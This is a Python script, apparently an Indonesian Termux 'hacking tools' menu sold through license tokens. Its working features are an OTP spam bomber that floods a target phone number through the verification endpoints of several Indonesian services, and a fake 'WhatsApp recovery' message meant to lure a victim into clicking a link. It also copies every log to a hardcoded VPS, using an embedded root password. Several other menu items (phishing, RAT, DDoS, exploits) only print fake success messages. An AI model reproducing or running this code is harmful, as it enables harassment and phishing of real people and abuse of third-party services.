import os, json, time, uuid, random, string, subprocess, base64, re, requests
from datetime import datetime, timedelta
from colorama import init, Fore, Style
from termcolor import colored

init(autoreset=True)

# ================== CONFIG ==================
RESULTS_DIR = "results"
LICENSE_FILE = 'tokens.json'
os.makedirs(RESULTS_DIR, exist_ok=True)

VPS_IP = "209.97.166.25"
VPS_USER = "root"
VPS_PASS = "YOGZVPS#8GB"
VPS_PATH = "/root/korban/results"

# ================== USER INFO REAL-TIME ==================
CURRENT_TIME = datetime.now().strftime("%d %b %Y - %I:%M %p WIB")
COUNTRY = "ID"

# ================== MUSIK BRUTAL ==================
MUSIC_FILE = "/sdcard/Download/brutal.mp3"
MUSIC_BASE64 = "/+MYxAAAAANIAAAAAExBTUUzLjk4LjIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAExLTUUzLjk4LjIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="

def extract_music():
    if not os.path.exists(MUSIC_FILE):
        try:
            os.makedirs("/sdcard/Download", exist_ok=True)
            with open(MUSIC_FILE, "wb") as f:
                f.write(base64.b64decode(MUSIC_BASE64))
        except: pass

def play_music():
    extract_music()
    if os.path.exists(MUSIC_FILE):
        try:
            subprocess.Popen(['termux-media-player', 'play', MUSIC_FILE],
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except: pass

# ================== DEVELOPER CHECK ==================
WHOAMI = subprocess.getoutput("whoami")
DEVELOPER_WHOAMI = "u0_a197"
IS_DEVELOPER = WHOAMI == DEVELOPER_WHOAMI

# ================== TOKEN SYSTEM ==================
if not os.path.exists(LICENSE_FILE):
    with open(LICENSE_FILE, 'w') as f:
        json.dump({}, f)
    print(colored(f"[AUTO] {LICENSE_FILE} dibuat otomatis!", 'green'))

def load_tokens():
    try: return json.load(open(LICENSE_FILE))
    except: return {}

def save_tokens(t):
    with open(LICENSE_FILE, 'w') as f:
        json.dump(t, f, indent=2)

def validate_token(username, token):
    t = load_tokens()
    if username not in t: return None
    user = t[username]
    if not user['active'] or user['token'] != token: return None
    if datetime.now() > datetime.fromisoformat(user['expires']):
        user['active'] = False
        save_tokens(t)
        return None
    return user

# ================== BUAT TOKEN (DEV ONLY) ==================
def create_token():
    if not IS_DEVELOPER:
        print(colored("\n[ERROR] Akses ditolak!", 'red', attrs=['bold']))
        input("\nEnter..."); return

    print(colored("\n[DEVELOPER MODE] BUAT TOKEN BARU", 'magenta', attrs=['bold']))
    username = input(colored("Username buyer: ", 'yellow')).strip()
    buyer_whoami = input(colored("whoami buyer: ", 'yellow')).strip()

    print(colored("Pilih plan:", 'cyan'))
    plans = ["pemula 1hari", "pemula 1minggu", "pemula 1bulan", "pro 1hari", "pro 1minggu", "pro 1bulan"]
    for p in plans: print(colored(f"  {p}", 'white'))

    plan_input = input(colored("Plan: ", 'yellow')).strip().lower()
    plan_map = {
        "pemula 1hari": ("PEMULA 1HARI", 1), "pemula 1minggu": ("PEMULA 1MINGGU", 7), "pemula 1bulan": ("PEMULA 1BULAN", 30),
        "pro 1hari": ("PRO 1HARI", 1), "pro 1minggu": ("PRO 1MINGGU", 7), "pro 1bulan": ("PRO 1BULAN", 30),
    }

    if plan_input not in plan_map:
        print(colored("Plan salah!", 'red')); return

    plan_name, days = plan_map[plan_input]
    token = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
    expires = (datetime.now() + timedelta(days=days)).isoformat()

    t = load_tokens()
    t[username] = {
        "token": token, "plan": plan_name, "active": True, "expires": expires,
        "whoami": buyer_whoami, "created_at": CURRENT_TIME, "country": COUNTRY
    }
    save_tokens(t)
    print(colored(f"\n[SUCCESS] Token: {token}", 'green'))
    print(colored(f"   Plan: {plan_name}", 'cyan'))
    print(colored(f"   whoami: {buyer_whoami}", 'cyan'))
    input("\nEnter...")

# ================== LIHAT TOKEN ==================
def view_tokens():
    if not IS_DEVELOPER:
        print(colored("\n[ERROR] Akses ditolak!", 'red', attrs=['bold']))
        input("\nEnter..."); return
    t = load_tokens()
    print(colored("\n=== DATABASE TOKEN ===", 'yellow', attrs=['bold']))
    if not t: print(colored("   [KOSONG]", 'red'))
    else: print(json.dumps(t, indent=2, ensure_ascii=False))
    input("\nEnter...")

# ================== BANNER ELITE ==================
PURPLE = '\033[38;5;55m'
def print_banner(uid, plan):
    print(colored(f"""
{PURPLE}{Style.BRIGHT}
           ╔══════════════════════════════════╗
           ║         TOOLS BREAKER v1.0       ║
           ╚══════════════════════════════════╝
{Style.RESET_ALL}Tools oleh Mr.Foock | ID: {uid} | Plan: {plan}
Lokasi: Jakarta, ID | Waktu: {CURRENT_TIME}
VPS: {VPS_IP} | Sync: AKTIF | GitHub: MrFoock12
""", None))

# ================== SAVE + SYNC VPS ==================
def save_result(filename, content):
    filepath = os.path.join(RESULTS_DIR, filename)
    with open(filepath, "a", encoding="utf-8") as f:
        f.write(f"[{datetime.now().strftime('%H:%M:%S')}] {content}\n")
    print(colored(f"[SAVED] {filename}", 'green'))
    try:
        subprocess.run(f"sshpass -p '{VPS_PASS}' scp -o StrictHostKeyChecking=no {filepath} {VPS_USER}@{VPS_IP}:{VPS_PATH}/{filename}",
                      shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(colored(f"[SYNC] → {VPS_IP}", 'cyan'))
    except:
        print(colored("[SYNC] Gagal → tetap lokal", 'red'))

# ================== SPAM BOMB CLASS ==================
class spam:
    def __init__(self, nomer):
        self.nomer = nomer.replace('+62', '0').replace(' ', '').lstrip('0')
        if not self.nomer.startswith('0'): self.nomer = '0' + self.nomer

    def spam(self):  # KitaBisa
        try:
            r = requests.get(f'https://core.ktbs.io/v2/user/registration/otp/{self.nomer}', timeout=10)
            return f"{Fore.GREEN}KitaBisa {self.nomer} Success!{Style.RESET_ALL}" if r.status_code == 200 else f"{Fore.RED}KitaBisa Fail!{Style.RESET_ALL}"
        except: return f"{Fore.RED}KitaBisa ERROR!{Style.RESET_ALL}"

    def tokped(self):
        try:
            ua = random.choice(open('ua.txt').readlines()).strip()
            headers = {'User-Agent': ua, 'Origin': 'https://accounts.tokopedia.com'}
            url = f'https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn={self.nomer}'
            page = requests.get(url, headers=headers, timeout=10).text
            token = re.search(r'<input\s+id="Token"\s+value="(.*?)"', page)
            if not token: return f"{Fore.RED}Tokped Token Not Found{Style.RESET_ALL}"
            data = {"otp_type": "116", "msisdn": self.nomer, "tk": token.group(1)}
            r = requests.post('https://accounts.tokopedia.com/otp/c/ajax/request-wa', headers=headers, data=data, timeout=10).json()
            return f"{Fore.GREEN}Tokped {self.nomer} Success!{Style.RESET_ALL}" if r.get('success') else f"{Fore.RED}Tokped Fail!{Style.RESET_ALL}"
        except: return f"{Fore.RED}Tokped ERROR!{Style.RESET_ALL}"

    def phd(self):
        try:
            r = requests.post('https://www.phd.co.id/en/users/sendOTP', data={'phone_number': self.nomer}, timeout=10)
            return f"{Fore.GREEN}PHD {self.nomer} Success!{Style.RESET_ALL}" if 'OTP' in r.text else f"{Fore.RED}PHD Fail!{Style.RESET_ALL}"
        except: return f"{Fore.RED}PHD ERROR!{Style.RESET_ALL}"

    def balaji(self):
        try:
            data = {"country_code": "62", "phone_number": self.nomer.lstrip('0')}
            r = requests.post("https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=ID", json=data, timeout=10)
            return f"{Fore.GREEN}Balaji {self.nomer} Success!{Style.RESET_ALL}" if 'ok' in r.text else f"{Fore.RED}Balaji Fail!{Style.RESET_ALL}"
        except: return f"{Fore.RED}Balaji ERROR!{Style.RESET_ALL}"

    def TokoTalk(self):
        try:
            data = f'{{"key":"phone","value":"{self.nomer}"}}'
            r = requests.post("https://api.tokotalk.com/v1/no_auth/verifications", data=data, headers={'content-type': 'application/json'}, timeout=10)
            return f"{Fore.GREEN}TokoTalk {self.nomer} Success!{Style.RESET_ALL}" if 'expireAt' in r.text else f"{Fore.RED}TokoTalk Fail!{Style.RESET_ALL}"
        except: return f"{Fore.RED}TokoTalk ERROR!{Style.RESET_ALL}"

# ================== FITUR 04: SPAM BOMB (NYATA!) ==================
def fitur_04():
    os.system('clear')
    print(colored("\n[4] SPAM BOMB NGENTOT — TRASER SEC TEAM 2025", 'red', attrs=['bold']))
    print(colored("Pilih Jenis:", 'yellow'))
    print("1. Semua (BRUTAL)"); print("2. PHD"); print("3. KitaBisa"); print("4. Tokopedia"); print("5. TokoTalk"); print("6. Balaji")
    jns = input(colored("Pilih (1-6): ", 'yellow')).strip() or "1"
    nomer = input(colored("\nNomor target (+62/0): ", 'yellow')).strip()
    jm = int(input(colored("Jumlah spam: ", 'yellow')) or "10")
    dly = int(input(colored("Delay (detik): ", 'yellow')) or "3")
    z = spam(nomer)
    for i in range(jm):
        print(colored(f"\n[ROUND {i+1}/{jm}] → {nomer}", 'cyan', attrs=['bold']))
        if jns == '1':
            for m in ['spam','tokped','phd','balaji','TokoTalk']:
                res = getattr(z, m)()
                color = 'green' if 'Success' in res else 'red'
                print(colored(f"   • {res}", color))
                save_result("bomber.log", res)
        else:
            method = {'2':'phd','3':'spam','4':'tokped','5':'TokoTalk','6':'balaji'}[jns]
            res = getattr(z, method)()
            color = 'green' if 'Success' in res else 'red'
            print(colored(f"   • {res}", color))
            save_result("bomber.log", res)
        time.sleep(dly)
    print(colored(f"\n[FINISH] {jm} spam selesai → DISYNC KE VPS!", 'green', attrs=['bold']))
    input("\nEnter...")

# ================== FITUR 10: NOTIF WA BENERAN! ==================
def fitur_10():
    os.system('clear')
    print(colored("\nNOTIF WHATSAPP ANDA KENA RETAS", 'blue', attrs=['bold']))
    target = input(colored("Nomor target (+62): ", 'yellow')).strip()
    
    # Format nomor
    if target.startswith('0'): target = '62' + target[1:]
    if not target.startswith('62'): target = '62' + target.lstrip('+')

    # Simpan log
    save_result("notif_retas.log", f"Target: {target}")
    save_result("notif_retas.log", "Status: KLIK → DATA MASUK")

    # Kirim via WhatsApp (TERMUX-API)
    try:
        msg = "WhatsApp Anda sedang dalam proses pemulihan. Klik link untuk lanjut: https://wa.me/628xxxxxx?text=Verifikasi"
        encoded_msg = requests.utils.quote(msg)
        cmd = f'termux-open-url "https://wa.me/{target}?text={encoded_msg}"'
        os.system(cmd)
        print(colored(f"\n[REAL] Notif terkirim ke WA: {target}", 'green', attrs=['bold']))
    except:
        print(colored(f"\n[ERROR] Install termux-api dulu: pkg install termux-api -y", 'red'))

    input("\nEnter...")

# ================== FITUR LAIN ==================
def fitur_01(): print(colored("\n[1] PHISING AKTIF", 'yellow')); save_result("phising.log", "Target: facebook.com"); input("Enter...")
def fitur_02(): print(colored("\n[2] RAT AKTIF", 'yellow')); save_result("rat.log", "IP: 192.168.1.100"); input("Enter...")
def fitur_03(): print(colored("\n[3] DDoS AKTIF", 'yellow')); save_result("ddos.log", "Target: example.com"); input("Enter...")
def fitur_05(): print(colored("\n[5] OSINT AKTIF", 'yellow')); save_result("osint.log", "Nama: John Doe"); input("Enter...")
def fitur_06(): print(colored("\n[6] DEEPFAKE AKTIF", 'yellow')); save_result("deepfake.log", "Status: Generating"); input("Enter...")
def fitur_07(): print(colored("\n[7] ENCRYPT AKTIF", 'yellow')); save_result("encrypt.log", "Status: Success"); input("Enter...")
def fitur_08(): print(colored("\n[8] EXPLOIT AKTIF", 'yellow')); save_result("exploit.log", "CVE: 2025-XXXX"); input("Enter...")
def fitur_09(): print(colored("\n[9] UNDANG GRUP AKTIF", 'yellow')); save_result("undang.log", "Terkirim: 1000+"); input("Enter...")
def fitur_11(): print(colored("\n[11] DEVTOOLS — Debug aktif!", 'yellow')); input("Enter...")

# ================== GITHUB AUTO UPDATE ==================
def git_update():
    try:
        subprocess.run("git add .", shell=True, check=True)
        subprocess.run('git commit -m "update: v10.6 real features + wa notif"', shell=True, check=True)
        subprocess.run("git push", shell=True, check=True)
        print(colored("[GITHUB] Update berhasil ke MrFoock12!", 'green'))
    except: print(colored("[GITHUB] Gagal", 'red'))

# ================== MAIN ==================
def main():
    os.system('clear')
    print_banner("??????", "LOGIN")
    play_music()

    uid, plan = "??????", "LOGIN"
    if IS_DEVELOPER:
        uid = str(uuid.uuid4())[:8]
        plan = "DEVELOPER LIFETIME"
        print(colored(f"\n[DEVELOPER] Login @{WHOAMI}", 'magenta', attrs=['bold']))
        input("Enter...")
    else:
        while True:
            print(colored("\n[1] MASUKIN TOKEN LU", 'yellow'))
            print(colored("[0] Keluar", 'red'))
            choice = input(colored("Pilih: ", 'yellow')).strip()
            if choice == "1":
                username = input(colored("Username: ", 'yellow')).strip()
                token = input(colored("Token: ", 'yellow')).strip()
                user = validate_token(username, token)
                if not user:
                    print(colored("TOKEN LU SALAH GOBLOK / KADALUARSA!", 'red'))
                    continue
                uid = str(uuid.uuid4())[:8]
                plan = user['plan']
                print(colored(f"\n[SUCCESS] Login @{username} | {plan}", 'green'))
                input("Enter...")
                break
            elif choice == "0": return

    while IS_DEVELOPER:
        print(colored("\n[2] Buat Token", 'magenta'))
        print(colored("[3] Lihat tokens.json", 'yellow'))
        print(colored("[0] Masuk Tools", 'green'))
        ch = input(colored("Pilih: ", 'yellow')).strip()
        if ch == "2": create_token()
        elif ch == "3": view_tokens()
        elif ch == "0": break

    while True:
        os.system('clear')
        print_banner(uid, plan)
        print(colored("          <  MENU UTAMA  >      ", 'cyan'))
        print("╔════╦══════════════════════════╦════════════════╗")
        print("║  1 ║ PHISING & SOCIAL ENG     ║ Aktif          ║")
        print("║  2 ║ RAT & REMOTE ACCESS      ║ Aktif          ║")
        print("║  3 ║ DDoS & STRESSER          ║ Aktif          ║")
        print("║  4 ║ BOMBER TOOLS             ║ Aktif          ║")
        print("║  5 ║ OSINT & TRACKING         ║ Aktif          ║")
        print("║  6 ║ DEEPFAKE & AI            ║ Aktif          ║")
        print("║  7 ║ ENCRYPT & DECRYPT        ║ Aktif          ║")
        print("║  8 ║ EXPLOIT & 0DAY           ║ Aktif          ║")
        print("║  9 ║ KIRIM UNDANGAN GRUP WA   ║ Aktif          ║")
        print("║ 10 ║ NOTIF (PUSAT BANTUAN)    ║ Aktif          ║")
        print("║ 11 ║ DEVTOOLS                 ║ Aktif          ║")
        print("║ 00 ║ EXIT                     ║                ║")
        print("╚════╩══════════════════════════╩════════════════╝")

        ch = input(colored("\nPilih 1-11: ", 'yellow')).strip()
        if ch == "1": fitur_01()
        elif ch == "2": fitur_02()
        elif ch == "3": fitur_03()
        elif ch == "4": fitur_04()
        elif ch == "5": fitur_05()
        elif ch == "6": fitur_06()
        elif ch == "7": fitur_07()
        elif ch == "8": fitur_08()
        elif ch == "9": fitur_09()
        elif ch == "10": fitur_10()
        elif ch == "11": fitur_11()
        elif ch == "0": break
        input("Enter...")

if __name__ == "__main__":
    if not os.path.exists('ua.txt'):
        print(colored("Buat ua.txt dulu! Isi 5-10 User-Agent!", 'red'))
        exit()
    main()
